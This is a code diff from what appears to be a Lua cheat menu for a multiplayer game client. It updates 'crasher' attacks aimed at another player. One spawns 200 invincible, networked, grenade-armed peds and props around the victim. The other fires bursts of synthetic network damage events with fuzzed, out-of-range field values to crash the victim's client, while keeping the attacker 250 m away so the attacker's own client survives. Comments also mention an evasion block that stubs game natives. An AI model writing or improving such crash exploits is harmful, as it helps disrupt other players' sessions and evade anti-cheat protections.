@@ -19818,7 +19818,7 @@ local C = (function(O,E,S)
 --
 --   Ped flood   an armed networked swarm: 200 player-model peds with grenade
 --               launchers and sixty props around the victim, firing for 20 s
---   Net crash   the msgArrayUpdate lane in PART 28_net_link.lua
+--   Net crash   the synthetic damage-event burst in PART 28_net_link.lua
 --
 -- The swarm is the proven vector from the reference corpus
 -- (AC/Nouveau/crasher_propsss.txt, v50). A passive clone ring does not crash a
@@ -20002,7 +20002,7 @@ C.props = {}
 C.shieldOn = false
 C.fps = 60
 C.fpsStop = true
-C.stats = { created = 0, props = 0, scenarios = 0, emotes = 0, waves = 0, fails = 0, control = 0 }
+C.stats = { created = 0, props = 0, networked = 0, scenarios = 0, emotes = 0, waves = 0, fails = 0, control = 0 }
 C.targetPed = 0
 C.targetDist = 0.0
 C.opDist = 0.0
@@ -20187,17 +20187,15 @@ local function deleteCreated(ent)
     pcall(DeleteEntity, ent)
 end
 
-local function baseNetworkPed(ped)
-    local okNet, netId = pcall(NetworkGetNetworkIdFromEntity, ped)
+local function baseNetworkPed(ent)
+    local okNet, netId = pcall(NetworkGetNetworkIdFromEntity, ent)
     if okNet and type(netId) == "number" and netId > 0 then
-        pcall(SetNetworkIdExistsOnAllMachines, netId, true)
-        -- Migration stays enabled: the closest client (the target) takes the
-        -- simulation. Keeping ownership here made the operator carry the whole
-        -- swarm and crash first.
         if type(SetNetworkIdCanMigrate) == "function" then
             pcall(SetNetworkIdCanMigrate, netId, true)
         end
+        return true
     end
+    return false
 end
 
 local function holdUntil(deadline, targetPed, abortCenter, abortDist)
@@ -20286,11 +20284,11 @@ end
 -- returns from before its ped policy. Mission entity so the engine keeps it.
 -- SetPedKeepTask keeps the combat task across ownership changes and respawns.
 local function spawnAssaultPed(hash, x, y, z, heading, targetPed, weapon)
-    local ped = CreatePed(4, hash, x, y, z, heading, true, false)
+    local ped = CreatePed(4, hash, x, y, z, heading, true, true)
     if not ped or ped == 0 or not DoesEntityExist(ped) then return 0 end
 
     pcall(SetEntityAsMissionEntity, ped, true, true)
-    baseNetworkPed(ped)
+    local netOk = baseNetworkPed(ped)
     pcall(SetEntityInvincible, ped, true)
     pcall(SetEntityProofs, ped, true, true, true, true, true, true, true, true)
     pcall(SetEntityCanBeDamaged, ped, false)
@@ -20317,7 +20315,7 @@ local function spawnAssaultPed(hash, x, y, z, heading, targetPed, weapon)
     pcall(TaskCombatPed, ped, targetPed, 0, 16)
 
     pcall(SetEntityLocallyInvisible, ped)
-    return ped
+    return ped, netOk
 end
 
 local function spawnProp(hash, x, y, z)
@@ -20328,13 +20326,7 @@ local function spawnProp(hash, x, y, z)
     pcall(SetEntityHasGravity, obj, false)
     pcall(SetEntityCollision, obj, true, true)
     pcall(SetEntityInvincible, obj, true)
-    local okNet, netId = pcall(NetworkGetNetworkIdFromEntity, obj)
-    if okNet and type(netId) == "number" and netId > 0 then
-        pcall(SetNetworkIdExistsOnAllMachines, netId, true)
-        if type(SetNetworkIdCanMigrate) == "function" then
-            pcall(SetNetworkIdCanMigrate, netId, true)
-        end
-    end
+    baseNetworkPed(obj)
     return obj
 end
 
@@ -20381,10 +20373,11 @@ local function runPedFlood(target)
         center = tc
         local hash = hashes[((i - 1) % #hashes) + 1]
         local x, y, z = ring(center, PED.radius)
-        local ped = spawnAssaultPed(hash, x, y, z + 0.6,
+        local ped, netOk = spawnAssaultPed(hash, x, y, z + 0.6,
             math.random() * 360.0, target.ped, weapon)
         if ped ~= 0 then
             trackCreated(ped)
+            if netOk then C.stats.networked = C.stats.networked + 1 end
         else
             C.stats.fails = C.stats.fails + 1
         end
@@ -20792,7 +20785,7 @@ function C.launch(kind)
     local okSid, sid = pcall(GetPlayerServerId, target.player)
     C.targetSid = (okSid and type(sid) == "number" and sid >= 0) and sid or nil
     C.opDist = target.dist
-    C.stats = { created = 0, props = 0, scenarios = 0, emotes = 0, waves = 0, fails = 0, control = 0 }
+    C.stats = { created = 0, props = 0, networked = 0, scenarios = 0, emotes = 0, waves = 0, fails = 0, control = 0 }
 
     Citizen.CreateThread(function()
         if kind == "ped" then
@@ -22110,7 +22103,28 @@ local NET = (function(O, C)
         return true
     end
 
-    function NET.damage(amount, flags)
+    local function netToast(text)
+        -- The loader overlay toast first: it is the same surface the rest of
+        -- the menu uses, and it does not depend on the text natives (the
+        -- evasion block stubs several of them globally).
+        pcall(Notify, tostring(text))
+        if type(BeginTextCommandThefeedPost) ~= "function"
+            or type(AddTextComponentSubstringPlayerName) ~= "function"
+            or type(EndTextCommandThefeedPostTicker) ~= "function" then
+            return
+        end
+        pcall(BeginTextCommandThefeedPost, "STRING")
+        pcall(AddTextComponentSubstringPlayerName, tostring(text))
+        pcall(EndTextCommandThefeedPostTicker, false, true)
+    end
+
+    -- Synthetic damage event, anchored at the victim with the victim as both
+    -- source and target. The server forwards the event to the clients that have
+    -- the target in scope; the operator stays 250 m away, outside that scope.
+    -- No local entity, no outgoing buffer, no array: this is the operator-safe
+    -- lane. The variant fuzzes the fields the receiver feeds into its damage
+    -- resolver: flags, actionResultHash/Id, actionUnk, hitComponent.
+    function NET.damage(v)
         if type(Susano) ~= "table" or type(Susano.SendNetworkDamage) ~= "function" then
             return false
         end
@@ -22121,58 +22135,69 @@ local NET = (function(O, C)
         local me = PlayerPedId()
         if type(ped) ~= "number" or ped == 0 or ped == me then return false end
         if not DoesEntityExist(ped) then return false end
-        if IsPedInAnyVehicle(me, false) then return false end
-        local now = GetGameTimer()
-        if now - NET.lastDamage < 1100 then return false end
-        NET.lastDamage = now
         local coords = GetEntityCoords(ped)
-        local x = coords and coords.x
-        local y = coords and coords.y
-        local z = coords and coords.z
+        local x, y, z = coords and coords.x, coords and coords.y, coords and coords.z
         if type(x) ~= "number" or type(y) ~= "number" or type(z) ~= "number" then
             return false
         end
-        local dmg = tonumber(amount) or 1.0
-        if dmg < 0.0 then dmg = 0.0 end
-        local fl = tonumber(flags) or 522
-        local okc = pcall(Susano.SendNetworkDamage, me, ped, x, y, z, dmg, 0, fl)
-        if not okc then return false end
-        return true
+        if type(v) ~= "table" then v = { dmg = tonumber(v) or 1.0 } end
+        local okc = pcall(Susano.SendNetworkDamage, ped, ped, x, y, z,
+            v.dmg or 1.0, v.wpn or 0, v.flags or 522,
+            v.arh or 0, v.ari or 0, v.au or 0, v.hc or 0)
+        return okc
     end
 
     function NET.crash()
-        NET.watch(45)
+        local stamp = GetGameTimer()
+        if NET.crashAt and stamp - NET.crashAt < 4000 then
+            O.log("net crash: cooling down")
+            return false
+        end
+        NET.crashAt = stamp
+        if type(Susano) ~= "table" or type(Susano.SendNetworkDamage) ~= "function" then
+            O.log("net crash: SendNetworkDamage unavailable")
+            netToast("Net crash: primitive unavailable")
+            return false
+        end
+        local okT, entry = pcall(C.target, "ped")
+        if not okT or type(entry) ~= "table" then
+            O.log("net crash: no target")
+            netToast("Net crash: select a target")
+            return false
+        end
+        if entry.dist < 250.0 then
+            O.log("net crash: target %.0f m, need 250 m", entry.dist)
+            netToast(("Net crash: move back to 250 m (now %.0f)"):format(entry.dist))
+            return false
+        end
 
-        -- Read-only probe: it learns which (array, elem) pairs this client
-        -- actually owns by watching the engine's own outgoing updates. The
-        -- outbound buffer is never modified: a mutated buffer can be applied
-        -- to the sender's own array and crash the operator first.
-        local probing = NET.probe(10)
+        NET.watch(25)
+        O.log("net crash: burst on %s at %.0f m", entry.name, entry.dist)
+        netToast(("Net crash: 24 hits on %s"):format(entry.name))
 
         local variants = {
-            { 0.0, 522 },
-            { 0.0, 525312 },
-            { 1.0, 522 },
-            { 1.0, 525312 },
+            { dmg = 0.0,   flags = 522,      hc = 0 },
+            { dmg = 0.0,   flags = 525312,   hc = 0 },
+            { dmg = 1.0,   flags = 522,      hc = 0xFFFF },
+            { dmg = 1.0,   flags = 525312,   hc = 0xFFFF },
+            { dmg = 0.0,   flags = -1,       arh = -1, ari = -1, au = -1, hc = -1 },
+            { dmg = 1.0,   flags = 0x7FFFFFFF,
+              arh = 0x7FFFFFFF, ari = 0x7FFFFFFF, au = 0x7FFFFFFF, hc = 0x7FFF },
+            { dmg = 1.0e9, flags = 0,        arh = 0xFFFF, ari = 0xFFFF,
+              au = 0xFFFF, hc = 0xFFFF },
         }
+
         Citizen.CreateThread(function()
-            if probing then Citizen.Wait(10600) end
-            local hasPairs = false
-            if type(NET.seen) == "table" then
-                for _ in pairs(NET.seen) do hasPairs = true break end
-            end
-            if hasPairs then
-                NET.start(7, true)
-            else
-                O.log("net crash: no owned pair seen, damage only")
-            end
-            for i = 1, 16 do
-                if i > 1 then Citizen.Wait(1100) end
+            local hits = 0
+            for i = 1, 24 do
                 local v = variants[(i - 1) % #variants + 1]
-                NET.damage(v[1], v[2])
+                if NET.damage(v) then hits = hits + 1 end
+                Citizen.Wait(120)
             end
+            O.log("net crash: %d/24 events sent", hits)
+            netToast(("Net crash: %d/24 events sent"):format(hits))
         end)
-        return probing
+        return true
     end
 
     return NET
@@ -31060,8 +31085,8 @@ local function installCrasher()
     end
 
     -- Only the vectors kept on purpose: the proven armed flood (200 RPG peds
-    -- + 60 props, 250 m green-crash gate, stop on target disconnect) and the read-only network probe with
-    -- its targeted duplicate burst and damage variants.
+    -- + 60 props, 250 m green-crash gate, stop on target disconnect) and the synthetic damage-event burst
+    -- (identity source/target, 250 m scope gate).
     tab.items = {
         {
             name = "Ped flood",
